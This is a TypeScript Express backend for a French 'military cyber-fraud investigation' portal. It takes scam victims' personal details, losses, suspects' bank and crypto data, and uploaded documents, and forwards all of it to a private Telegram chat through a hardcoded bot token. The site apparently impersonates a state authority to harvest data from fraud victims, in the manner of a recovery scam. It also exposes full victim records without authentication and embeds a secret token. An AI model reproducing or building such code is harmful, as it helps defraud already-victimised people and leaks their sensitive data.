import express from "express";
import path from "path";
import fs from "fs";
import { createServer as createViteServer } from "vite";
import dotenv from "dotenv";

// Load environment variables
dotenv.config();

const app = express();
const PORT = 3000;

// Enable JSON parsing
app.use(express.json({ limit: '10mb' }));

// Path for report database
const REPORTS_FILE = path.join(process.cwd(), "reports.json");

// Helper to escape HTML for Telegram API safety
function escapeHtml(unsafe: any): string {
  if (unsafe === null || unsafe === undefined) return "";
  const str = String(unsafe);
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// Read reports from file
function readReports(): any[] {
  try {
    if (fs.existsSync(REPORTS_FILE)) {
      const data = fs.readFileSync(REPORTS_FILE, "utf-8");
      return JSON.parse(data);
    }
  } catch (error) {
    console.error("Error reading reports file:", error);
  }
  return [];
}

// Write reports to file
function writeReports(reports: any[]): void {
  try {
    fs.writeFileSync(REPORTS_FILE, JSON.stringify(reports, null, 2), "utf-8");
  } catch (error) {
    console.error("Error writing reports file:", error);
  }
}

// API endpoint to submit a report
app.post("/api/reports", async (req, res) => {
  try {
    const {
      victimName,
      victimPhone,
      victimEmail,
      victimCountry,
      scamCategory,
      scamDate,
      amount,
      currency,
      description,
      suspectName,
      suspectPhone,
      suspectEmail,
      suspectPlatform,
      suspectAccounts,
      files, // Array of { name, size, type }
      userEmail,
    } = req.body;

    // Validate fields - We removed hard requirements per user request
    const cleanVictimName = victimName || "Anonyme";
    const cleanScamCategory = scamCategory || "Non spécifiée";
    const cleanAmount = amount || "Non spécifié";
    const cleanDescription = description || "Aucun récit de fait fourni.";

    // Generate unique Report ID
    const randomNum = Math.floor(100000 + Math.random() * 900000);
    const reportId = `MIL-FR-${new Date().getFullYear()}-${randomNum}`;
    
    const cleanFiles = files ? files.map((f: any) => ({
      name: f.name,
      size: f.size,
      type: f.type
    })) : [];

    const newReport = {
      id: reportId,
      createdAt: new Date().toISOString(),
      status: "received", // received, analyzing, investigation_launched, active_tracking, resolved
      statusHistory: [
        {
          status: "received",
          label: "Dossier Reçu et Enregistré",
          timestamp: new Date().toISOString(),
          description: "Le dossier a été enregistré avec succès dans la base de données de l'unité d'investigation militaire cyber-fraude."
        }
      ],
      victimName: cleanVictimName,
      victimPhone,
      victimEmail,
      victimCountry,
      scamCategory: cleanScamCategory,
      scamDate,
      amount: cleanAmount,
      currency,
      description: cleanDescription,
      suspectName,
      suspectPhone,
      suspectEmail,
      suspectPlatform,
      suspectAccounts,
      files: cleanFiles,
      userEmail: userEmail || "Anonyme",
    };

    // Save report locally
    const reports = readReports();
    reports.push(newReport);
    writeReports(reports);

    // Send notification to Telegram
    const botToken = process.env.TELEGRAM_BOT_TOKEN || "8658469588:AAHukTSdXFZmoKtBFlceLLoSbPgeTFCPVy0";
    const chatId = process.env.TELEGRAM_CHAT_ID || "8529673558";

    const filesCount = files ? files.length : 0;
    const filesList = files && files.length > 0
      ? files.map((f: any) => `• 📄 <i>${escapeHtml(f.name)} (${(f.size / 1024).toFixed(1)} KB)</i>`).join("\n")
      : "<i>Aucun fichier fourni</i>";

    // Format HTML Message for Telegram
    const telegramMessage = `
🚨 <b>NOUVEAU SIGNALEMENT DE FRAUDE</b> 🚨
--------------------------------------------------
<b>Dossier N° :</b> <code>${escapeHtml(reportId)}</code>
<b>Date :</b> ${new Date().toLocaleString("fr-FR")}

👤 <b>INFORMATIONS DE LA VICTIME</b>
• <b>Nom complet :</b> ${escapeHtml(cleanVictimName)}
• <b>Téléphone :</b> ${escapeHtml(victimPhone || "Non renseigné")}
• <b>E-mail :</b> ${escapeHtml(victimEmail || "Non renseigné")}
• <b>Pays de résidence :</b> ${escapeHtml(victimCountry || "Non renseigné")}

⚠️ <b>DÉTAILS DU PRÉJUDICE</b>
• <b>Type d'arnaque :</b> ${escapeHtml(cleanScamCategory)}
• <b>Date des faits :</b> ${escapeHtml(scamDate || "Non spécifié")}
• <b>Montant volé :</b> <b>${escapeHtml(cleanAmount)} ${escapeHtml(currency)}</b>

🕵️ <b>INFORMATIONS SUR LE SUSPECT</b>
• <b>Nom/Pseudo :</b> ${escapeHtml(suspectName || "Inconnu")}
• <b>Téléphone/WhatsApp :</b> ${escapeHtml(suspectPhone || "Non renseigné")}
• <b>E-mail suspect :</b> ${escapeHtml(suspectEmail || "Non renseigné")}
• <b>Site Web / Réseau Social :</b> ${escapeHtml(suspectPlatform || "Non renseigné")}
• <b>Coordonnées bancaires/Crypto :</b> ${escapeHtml(suspectAccounts || "Non renseigné")}

📝 <b>RÉCIT DES FAITS</b>
<i>${escapeHtml(cleanDescription)}</i>

📎 <b>PIÈCES JOINTES (${filesCount})</b>
${filesList}

--------------------------------------------------
🛡️ <i>Signalement reçu via le Portail Militaire d'Investigation. Dossier transmis à la cellule cyber-fraude et de recouvrement des avoirs.</i>
`.trim();

    // Fire-and-forget Telegram API call (we catch errors to avoid failing the report itself)
    let telegramSent = false;
    let telegramError = null;
    try {
      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: telegramMessage,
          parse_mode: "HTML",
        }),
      });

      if (response.ok) {
        telegramSent = true;
        console.log(`Telegram message sent successfully for report: ${reportId}`);

        // Send files to Telegram if any are attached
        if (files && files.length > 0) {
          for (const file of files) {
            if (file.content) {
              try {
                // file.content is a base64 Data URL, e.g. "data:image/png;base64,iVBOR..."
                const matches = file.content.match(/^data:([A-Za-z-+\/]+);base64,(.+)$/);
                if (matches && matches.length === 3) {
                  const mimeType = matches[1];
                  const base64Data = matches[2];
                  const buffer = Buffer.from(base64Data, "base64");

                  // Create Blob for FormData
                  const fileBlob = new Blob([buffer], { type: mimeType });
                  const formData = new FormData();
                  formData.append("chat_id", chatId);

                  // Send as photo if it's an image, otherwise send as document
                  const isImage = mimeType.startsWith("image/");
                  const telegramMethod = isImage ? "sendPhoto" : "sendDocument";
                  const fileFieldName = isImage ? "photo" : "document";

                  formData.append(fileFieldName, fileBlob, file.name);
                  formData.append("caption", `📎 Dossier: ${reportId}\n📄 Fichier: ${file.name}`);

                  const fileRes = await fetch(`https://api.telegram.org/bot${botToken}/${telegramMethod}`, {
                    method: "POST",
                    body: formData,
                  });

                  if (fileRes.ok) {
                    console.log(`File ${file.name} sent successfully to Telegram.`);
                  } else {
                    const fileErrText = await fileRes.text();
                    console.error(`Failed to send file ${file.name} to Telegram:`, fileErrText);
                  }
                } else {
                  console.error(`Invalid base64 format for file ${file.name}`);
                }
              } catch (fileErr) {
                console.error(`Error sending file ${file.name} to Telegram:`, fileErr);
              }
            }
          }
        }
      } else {
        const errorText = await response.text();
        telegramError = errorText;
        console.error(`Telegram API error for report ${reportId}:`, errorText);
      }
    } catch (err: any) {
      telegramError = err.message || err;
      console.error(`Failed to send Telegram message for report ${reportId}:`, err);
    }

    return res.status(201).json({
      success: true,
      reportId,
      telegramSent,
      telegramError: telegramSent ? null : telegramError,
    });
  } catch (error: any) {
    console.error("Internal Server Error in /api/reports:", error);
    return res.status(500).json({ error: "Une erreur interne est survenue lors de l'enregistrement." });
  }
});

// API endpoint to query report status
app.get("/api/reports/:id", (req, res) => {
  const { id } = req.params;
  const reports = readReports();
  const report = reports.find((r) => r.id === id);

  if (!report) {
    return res.status(404).json({ error: "Dossier introuvable. Veuillez vérifier l'identifiant." });
  }

  return res.json(report);
});

// Path for contact database
const CONTACTS_FILE = path.join(process.cwd(), "contacts.json");

// API endpoint to submit contact form
app.post("/api/contact", async (req, res) => {
  try {
    const { name, email, subject, message } = req.body;
    if (!name || !email || !message) {
      return res.status(400).json({ error: "Veuillez remplir les champs obligatoires (nom, e-mail, message)." });
    }

    let contacts: any[] = [];
    if (fs.existsSync(CONTACTS_FILE)) {
      try {
        const raw = fs.readFileSync(CONTACTS_FILE, "utf-8");
        contacts = JSON.parse(raw);
      } catch (e) {
        console.error("Error reading contacts.json", e);
      }
    }

    const newContactMessage = {
      id: `MSG-${Date.now()}-${Math.floor(1000 + Math.random() * 9000)}`,
      createdAt: new Date().toISOString(),
      name,
      email,
      subject: subject || "No Subject",
      message
    };

    contacts.push(newContactMessage);
    fs.writeFileSync(CONTACTS_FILE, JSON.stringify(contacts, null, 2), "utf-8");

    console.log(`New contact message received from ${name} (${email}) and saved locally.`);

    // Forward to Telegram instead of Formspree securely
    const botToken = process.env.TELEGRAM_BOT_TOKEN || "8658469588:AAHukTSdXFZmoKtBFlceLLoSbPgeTFCPVy0";
    const chatId = process.env.TELEGRAM_CHAT_ID || "8529673558";
    
    const contactTelegramMessage = `
💬 <b>NOUVEAU MESSAGE DE CONTACT</b> 💬
--------------------------------------------------
<b>Nom :</b> ${escapeHtml(name)}
<b>E-mail :</b> ${escapeHtml(email)}
<b>Sujet :</b> ${escapeHtml(subject || "Non renseigné")}
<b>Message :</b>
<i>${escapeHtml(message)}</i>
--------------------------------------------------
`.trim();

    let telegramSent = false;
    let telegramError = null;

    try {
      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: contactTelegramMessage,
          parse_mode: "HTML",
        }),
      });

      if (response.ok) {
        telegramSent = true;
        console.log("Contact message successfully forwarded to Telegram.");
      } else {
        const errText = await response.text();
        telegramError = errText;
        console.error("Telegram API contact error response:", errText);
      }
    } catch (err: any) {
      telegramError = err.message || err;
      console.error("Failed to send contact message to Telegram:", err);
    }

    return res.status(200).json({ 
      success: true, 
      id: newContactMessage.id, 
      telegramSent,
      telegramError: telegramSent ? null : telegramError 
    });
  } catch (err: any) {
    console.error("Error in /api/contact:", err);
    return res.status(500).json({ error: "Impossible de sauvegarder votre message." });
  }
});



// Configure Vite or Serve SPA index.html
async function startServer() {
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on port ${PORT}`);
  });
}

startServer();
